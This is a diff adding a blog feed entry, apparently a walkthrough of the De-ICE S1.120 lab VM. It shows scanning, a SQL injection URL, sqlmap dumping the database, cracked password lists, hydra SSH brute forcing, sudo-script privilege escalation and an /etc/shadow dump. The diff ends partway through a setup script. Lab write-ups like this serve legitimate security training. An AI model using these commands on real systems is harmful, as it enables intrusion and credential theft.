@@ -4,7 +4,7 @@
   <title><![CDATA[0x41414141]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-05-11T21:21:24+02:00</updated>
+  <updated>2015-05-13T16:22:02+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,694 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[DE-ICE-S1.120]]></title>
+    <link href="http://73696e65.github.io/blog/2015/05/13/de-ice-s1-dot-120/"/>
+    <updated>2015-05-13T15:54:08+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/05/13/de-ice-s1-dot-120</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1120,10/">De-ICE: S1.120</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE  VERSION
+</span><span class='line'>21/tcp   open  ftp      ProFTPD 1.3.2
+</span><span class='line'>22/tcp   open  ssh      OpenSSH 5.1 (protocol 2.0)
+</span><span class='line'>80/tcp   open  http     Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
+</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)
+</span><span class='line'>Service Info: OS: Unix</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nikto output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.1.120
+</span><span class='line'>- Nikto v2.1.6
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          192.168.1.120
+</span><span class='line'>+ Target Hostname:    192.168.1.120
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2015-05-07 00:29:50 (GMT2)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Apache/2.2.11 (Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0
+</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.2.9
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 8430, size: 30894, mtime: Fri May 11 14:40:36 2007
+</span><span class='line'>+ mod_apreq2-20051231/2.6.0 appears to be outdated (current is at least 2.6.1)
+</span><span class='line'>+ mod_perl/2.0.4 appears to be outdated (current is at least 2.0.7)
+</span><span class='line'>+ Apache/2.2.11 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+</span><span class='line'>+ mod_ssl/2.2.11 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+</span><span class='line'>+ PHP/5.2.9 appears to be outdated (current is at least 5.4.26)
+</span><span class='line'>+ Perl/v5.10.0 appears to be outdated (current is at least v5.14.2)
+</span><span class='line'>+ OpenSSL/0.9.8k appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
+</span><span class='line'>+ mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+</span><span class='line'>+ OSVDB-3268: /webalizer/: Directory indexing found.
+</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+</span><span class='line'>+ OSVDB-3233: /cgi-bin/printenv: Apache 2.0 default script is executable and gives server environment variables. All default scripts should be removed. It may also allow XSS types of attacks. http://www.securityfocus.com/bid/4431.
+</span><span class='line'>+ OSVDB-3233: /cgi-bin/test-cgi: Apache 2.0 default script is executable and reveals system information. All default scripts should be removed.
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
+</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
+</span><span class='line'>+ 7354 requests: 0 error(s) and 25 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2015-05-07 00:30:03 (GMT2) (13 seconds)
+</span><span class='line'>---------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see, Nikto reveals the installation of phpmyadmin and some minor
+vulnerabilities. There is an information about CVE-2002-0082 too, but we didn&rsquo;t
+find any exploit for the issue.</p>
+
+<p>We connect to the web page, add a few products and try sql injection:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.120/products.php?id=2 or 1=1--+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found out that it works so we try sqlmap to dump the whole database content:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://192.168.1.120/products.php?id=1" -p id --dump-all</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This gives us the mysql sha1 hashes. After a small formating, we got:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > hashes.csv
+</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john --format=mysql-sha1 hashes.csv
+</span><span class='line'>Loaded 50 password hashes with no different salts (MySQL 4.1 double-SHA-1 [128/128 SSE2 intrinsics 8x])
+</span><span class='line'>123456           (bwatkins)
+</span><span class='line'>12345            (ktso)
+</span><span class='line'>password         (krenfro)
+</span><span class='line'>12345678         (amaynard)
+</span><span class='line'>abc123           (cchisholm)
+</span><span class='line'>computer         (jalvarez)
+</span><span class='line'>1234             (dwestling)
+</span><span class='line'>qwerty           (tdeleon)
+</span><span class='line'>internet         (sgains)
+</span><span class='line'>shadow           (jfranklin)
+</span><span class='line'>baseball         (kwebber)
+</span><span class='line'>letmein          (dstevens)
+</span><span class='line'>dragon           (bbanter)
+</span><span class='line'>jordan           (mbryan)
+</span><span class='line'>michael          (aweiland)
+</span><span class='line'>michelle         (hlovell)
+</span><span class='line'>trustno1         (rpatel)
+</span><span class='line'>soccer           (dgrant)
+</span><span class='line'>batman           (aadams)
+</span><span class='line'>football         (mholland)
+</span><span class='line'>iloveyou         (rdominguez)
+</span><span class='line'>jennifer         (mrodriguez)
+</span><span class='line'>master           (strammel)
+</span><span class='line'>monkey           (jbresnahan)
+</span><span class='line'>pepper           (djohnson)
+</span><span class='line'>sunshine         (ccoffee)
+</span><span class='line'>whatever         (aheflin)
+</span><span class='line'>welcome          (jalcantar)
+</span><span class='line'>111111           (jayala)
+</span><span class='line'>654321           (bphillips)
+</span><span class='line'>666666           (aspears)
+</span><span class='line'>killer           (dcooper)
+</span><span class='line'>princess         (kclemons)
+</span><span class='line'>superman         (aharp)
+</span><span class='line'>123123           (tgoodchap)
+</span><span class='line'>1234567          (aallen)
+</span><span class='line'>cheese           (lmorales)
+</span><span class='line'>starwars         (myajima)
+</span><span class='line'>Password         (mnader)
+</span><span class='line'>nintendo         (dgilfillan)
+</span><span class='line'>pokemon          (rjacobson)
+</span><span class='line'>passw0rd         (lmartinez)
+</span><span class='line'>0                (dtraylor)
+</span><span class='line'>consumer         (sjohnson)
+</span><span class='line'>gawker           (jduff)
+</span><span class='line'>kotaku           (swarren)
+</span><span class='line'>babyl0n          (jdavenport)
+</span><span class='line'>gizmodo          (qpowers)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Trying to login through ssh:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john --format=mysql-sha1 hashes.csv --show | grep : > ~/user-pass.list
+</span><span class='line'>root@kali32:~# hydra -C user-pass.list 192.168.1.120 ssh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We use one of the accounts to log in and check if there is any user with the higher privileges:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>rdominguez@slax:~$ cat /etc/group
+</span><span class='line'>root:x:0:root
+</span><span class='line'>bin:x:1:root,bin
+</span><span class='line'>daemon:x:2:root,bin,daemon
+</span><span class='line'>sys:x:3:root,bin,adm
+</span><span class='line'>adm:x:4:root,adm,daemon
+</span><span class='line'>tty:x:5:
+</span><span class='line'>disk:x:6:root,adm
+</span><span class='line'>lp:x:7:lp
+</span><span class='line'>mem:x:8:
+</span><span class='line'>kmem:x:9:
+</span><span class='line'>wheel:x:10:root
+</span><span class='line'>floppy:x:11:root
+</span><span class='line'>mail:x:12:mail
+</span><span class='line'>news:x:13:news
+</span><span class='line'>uucp:x:14:uucp
+</span><span class='line'>man:x:15:
+</span><span class='line'>audio:x:17:root
+</span><span class='line'>video:x:18:root
+</span><span class='line'>cdrom:x:19:root
+</span><span class='line'>games:x:20:
+</span><span class='line'>slocate:x:21:
+</span><span class='line'>utmp:x:22:
+</span><span class='line'>smmsp:x:25:smmsp
+</span><span class='line'>tape:x:26:root
+</span><span class='line'>mysql:x:27:
+</span><span class='line'>rpc:x:32:
+</span><span class='line'>sshd:x:33:sshd
+</span><span class='line'>gdm:x:42:
+</span><span class='line'>shadow:x:43:
+</span><span class='line'>ftp:x:50:
+</span><span class='line'>apache:x:80:
+</span><span class='line'>messagebus:x:81:
+</span><span class='line'>haldaemon:x:82:
+</span><span class='line'>plugdev:x:83:root
+</span><span class='line'>power:x:84:
+</span><span class='line'>pop:x:90:pop
+</span><span class='line'>scanner:x:93:
+</span><span class='line'>nobody:x:98:nobody
+</span><span class='line'>nogroup:x:99:
+</span><span class='line'>users:x:100:ccoffee
+</span><span class='line'>console:x:101:
+</span><span class='line'>admin:x:102:ccoffee</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Right, ccoffee is in admin group. For other users it is not allowed to use sudo.</p>
+
+<p>We check his competencies:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ssh 192.168.1.120 -l ccoffee
+</span><span class='line'>ccoffee@192.168.1.120's password:
+</span><span class='line'>Linux 2.6.27.27.
+</span><span class='line'>ccoffee@slax:~$ sudo -l
+</span><span class='line'>User ccoffee may run the following commands on this host:
+</span><span class='line'>    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a script in his home directory that he can execute, unfortunately we
+cannot read the content. Removing the script and creating a new one with the
+content &lsquo;sh&rsquo; gives root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ccoffee@slax:~/scripts$ sudo ./getlogs.sh
+</span><span class='line'>sh-3.1#
+</span><span class='line'>
+</span><span class='line'>sh-3.1# cat /etc/shadow
+</span><span class='line'>root:$1$rxn0aycI$hsQIsFGccfDbCG5/1nfH91:16567:0:::::
+</span><span class='line'>bin:*:9797:0:::::
+</span><span class='line'>daemon:*:9797:0:::::
+</span><span class='line'>adm:*:9797:0:::::
+</span><span class='line'>lp:*:9797:0:::::
+</span><span class='line'>sync:*:9797:0:::::
+</span><span class='line'>shutdown:*:9797:0:::::
+</span><span class='line'>halt:*:9797:0:::::
+</span><span class='line'>mail:*:9797:0:::::
+</span><span class='line'>news:*:9797:0:::::
+</span><span class='line'>uucp:*:9797:0:::::
+</span><span class='line'>operator:*:9797:0:::::
+</span><span class='line'>games:*:9797:0:::::
+</span><span class='line'>ftp:*:9797:0:::::
+</span><span class='line'>smmsp:*:9797:0:::::
+</span><span class='line'>mysql:*:9797:0:::::
+</span><span class='line'>rpc:*:9797:0:::::
+</span><span class='line'>sshd:*:9797:0:::::
+</span><span class='line'>gdm:*:9797:0:::::
+</span><span class='line'>pop:*:9797:0:::::
+</span><span class='line'>apache:*:9797:0:::::
+</span><span class='line'>messagebus:*:9797:0:::::
+</span><span class='line'>haldaemon:*:9797:0:::::
+</span><span class='line'>nobody:*:9797:0:::::
+</span><span class='line'>myajima:$1$60c/cucI$5j0aMHbj4jNDRAYhb4m3K0:16567:0:99999:7:::
+</span><span class='line'>lmartinez:$1$rMh/hucI$Pr6vOoriwdZPgphX0nSTa1:16567:0:99999:7:::
+</span><span class='line'>mbryan:$1$.di/mucI$oOj2Jz4nBoVxTqDo1im.X0:16567:0:99999:7:::
+</span><span class='line'>krenfro:$1$Hvj/rucI$Cg2UjwsziydtkBqypwdHp/:16567:0:99999:7:::
+</span><span class='line'>dgilfillan:$1$V7l/wucI$cKtiNIUgy2TYFi5pxWCCH.:16567:0:99999:7:::
+</span><span class='line'>jduff:$1$uJm//vcI$llf6cmzpyYX84rgky6lfK0:16567:0:99999:7:::
+</span><span class='line'>amaynard:$1$QZn/4vcI$8QI5BxGxAMU/aCl7IJ1Nm1:16567:0:99999:7:::
+</span><span class='line'>aallen:$1$kso/9vcI$woWfNYjoIWhvV6r5j7Xxa/:16567:0:99999:7:::
+</span><span class='line'>aadams:$1$q5q/EvcI$yWIE/.cQu8APDgjY.5ABV/:16567:0:99999:7:::
+</span><span class='line'>aard:$1$INr/JvcI$8S6mudd4gUth0CmMxh.Ab0:16567:0:99999:7:::
+</span><span class='line'>rpatel:$1$scs/OvcI$8jSf3YcG9TpSU6yuI6q5G0:16567:0:99999:7:::
+</span><span class='line'>qpowers:$1$7st/TvcI$7GqfQsXLy2v8CosCkCTNV1:16567:0:99999:7:::
+</span><span class='line'>dstevens:$1$d4v/YvcI$dRWsGihSIwWOCOV1uIzzv.:16567:0:99999:7:::
+</span><span class='line'>bphillips:$1$2Lw/dvcI$yr0cO6WTpKMPv89xi99Hi/:16567:0:99999:7:::
+</span><span class='line'>aheflin:$1$mjx/ivcI$1hvn.7HlbUqLB2Vp.WRpn0:16567:0:99999:7:::
+</span><span class='line'>mrodriguez:$1$80z/nvcI$W7S6KtvKXWiJAaDjU6Cbd/:16567:0:99999:7:::
+</span><span class='line'>tgoodchap:$1$ER.0svcI$F6ZxBlWOy6pQUlhDC7.VD1:16567:0:99999:7:::
+</span><span class='line'>djohnson:$1$Ej/0xvcI$8lRyGhMsdM8OUYA5qbDs1.:16567:0:99999:7:::
+</span><span class='line'>mholland:$1$I5100wcI$9tJothOx.INRYNMF7016P/:16567:0:99999:7:::
+</span><span class='line'>dtraylor:$1$OT205wcI$vlX3N7czGPvJGOCgOXDzA0:16567:0:99999:7:::
+</span><span class='line'>bwatkins:$1$Um30AwcI$Xb333lgx4Mcx7PApUoQnN/:16567:0:99999:7:::
+</span><span class='line'>rjacobson:$1$6650FwcI$yHSb8Kr7hUHyny3Y.mDXQ0:16567:0:99999:7:::
+</span><span class='line'>jfranklin:$1$Ti60KwcI$nKUPLiDD67sl9lUTf3aJ90:16567:0:99999:7:::
+</span><span class='line'>swarren:$1$2y70PwcI$DpY/2bG7k.DUI.E0i19Fh/:16567:0:99999:7:::
+</span><span class='line'>mnader:$1$3K90UwcI$3vkAOSnLqK44jBF.kDVWE1:16567:0:99999:7:::
+</span><span class='line'>strammel:$1$QmA0ZwcI$mp5SxAjrzs1nqjf6cxztK1:16567:0:99999:7:::
+</span><span class='line'>rdominguez:$1$gIC0ewcI$7VCqMoXzYKW1vgzCaglJ6.:16567:0:99999:7:::
+</span><span class='line'>jbresnahan:$1$qnD0jwcI$yg30Ub/pK3fcx9U50VP701:16567:0:99999:7:::
+</span><span class='line'>cchisholm:$1$K7F0owcI$3WhfwvSnQzEfvVWjZnhm2/:16567:0:99999:7:::
+</span><span class='line'>aspears:$1$/ZG0twcI$o1Yw0aAr86poWqk7.PZy3.:16567:0:99999:7:::
+</span><span class='line'>dwestling:$1$QxH0ywcI$yXczKrqz56FctGhw3AKV41:16567:0:99999:7:::
+</span><span class='line'>sjohnson:$1$1hJ01xcI$hRY/wfBlj3cYqCpPrdO1j.:16567:0:99999:7:::
+</span><span class='line'>hlovell:$1$U9L06xcI$kj0vAVGLnx.9TcQr88ZoN0:16567:0:99999:7:::
+</span><span class='line'>tdeleon:$1$UaM0BxcI$i9zo//F6m3IGEXWF4E4VU.:16567:0:99999:7:::
+</span><span class='line'>ccoffee:$1$FDO0GxcI$1Gl5A67Slt0mhD7iiZaLr/:16567:0:99999:7:::
+</span><span class='line'>jalvarez:$1$EbP0LxcI$pMZtEjdYdkrQRCuyw3zQ00:16567:0:99999:7:::
+</span><span class='line'>jalcantar:$1$H4R0QxcI$HFlaU41TFGRu0LAC0Fv0g.:16567:0:99999:7:::
+</span><span class='line'>sgains:$1$hiS0VxcI$FCEDYdN96OmIfnttnE6f21:16567:0:99999:7:::
+</span><span class='line'>bbanter:$1$99U0axcI$TONdzMbnM4yotrbmBCTU7/:16567:0:99999:7:::
+</span><span class='line'>lmorales:$1$WZV0fxcI$l5OZvem/JITin7SydRcoS.:16567:0:99999:7:::
+</span><span class='line'>jayala:$1$5zW0kxcI$ghdAHJPWYrkNWLatUJwxe1:16567:0:99999:7:::
+</span><span class='line'>kclemons:$1$lIY0pxcI$/4/W5o0NzWszs9aKQyZVt/:16567:0:99999:7:::
+</span><span class='line'>aharp:$1$qdZ0uxcI$OdHV6pN42eG9DoYc.ToNo0:16567:0:99999:7:::
+</span><span class='line'>kwebber:$1$.Eb0zxcI$sdvd7YNQIBUhTFGfBr./W/:16567:0:99999:7:::
+</span><span class='line'>dgrant:$1$2cc02ycI$IL9nHFcDzbkDsj97kJk860:16567:0:99999:7:::
+</span><span class='line'>jdavenport:$1$uJo0cycI$wH8zAEudh0JToiTfDFYwT/:16567:0:99999:7:::
+</span><span class='line'>ktso:$1$/ff0CycI$2mPgNapzGACNxu0MXFs4P1:16567:0:99999:7:::
+</span><span class='line'>aweiland:$1$TAh0HycI$pJtJ5xBl2AZc4nbKKBhR6.:16567:0:99999:7:::
+</span><span class='line'>dcooper:$1$Egi0MycI$lxdN6qIIFOkCAPTHbk8Tu/:16567:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We realized that the passwords are different when we reboot the server. Digging deeper, we find more clues:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/mnt/live/memory/changes# cat ./etc/rc.d/rc.local
+</span><span class='line'>..
+</span><span class='line'>root@slax:/mnt/live# vim /mnt/hdc/slax/rootcopy/opt/lampp/htdocs/setup.sh
+</span><span class='line'>..
+</span><span class='line'><span class="c">#Shuffle the users and passwords, create usernames, and match them up with passwords</span>
+</span><span class='line'><span class="c">#The 50 passwords come from top 50 in Gawker media&#39;s password breach</span>
+</span><span class='line'>shuf -o /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/pass50.txt
+</span><span class='line'>shuf -o /opt/lampp/htdocs/users.txt /opt/lampp/htdocs/users.txt
+</span><span class='line'>awk <span class="s1">&#39;/./ {print tolower(substr($1,1,1))tolower($2)}&#39;</span> /opt/lampp/htdocs/users.txt &gt; /opt/lampp/htdocs/usernames.txt
+</span><span class='line'>paste -d<span class="s1">&#39; &#39;</span> /opt/lampp/htdocs/usernames.txt /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/users.txt &gt; /opt/lampp/htdocs/userpass.txt
+</span><span class='line'>..
+</span><span class='line'>
+</span><span class='line'><span class="c">#Set root OS password</span>
